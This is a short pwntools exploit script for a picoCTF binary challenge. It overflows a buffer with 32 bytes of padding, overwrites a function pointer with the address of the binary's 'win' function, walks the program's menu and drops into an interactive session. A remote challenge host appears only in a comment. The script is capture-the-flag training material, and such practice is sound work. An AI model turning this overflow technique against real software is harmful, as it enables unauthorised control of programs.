from pwn import *

#p = remote('mimas.picoctf.net', 61782)
elf = context.binary = ELF('./chall',checksec=False)
p = process('./chall')
    
sla = p.sendlineafter

buff = b"A" * 32
#got = "0x404018"
win  = elf.sym['win']

pay = buff
pay += p64(win)

def exp():
    sla(b"choice: ", b"2")
    sla(b": ", pay)
    sla(b": ", b"1")
    sla(b": ", b"4")

exp()

print(pay)

p.interactive()
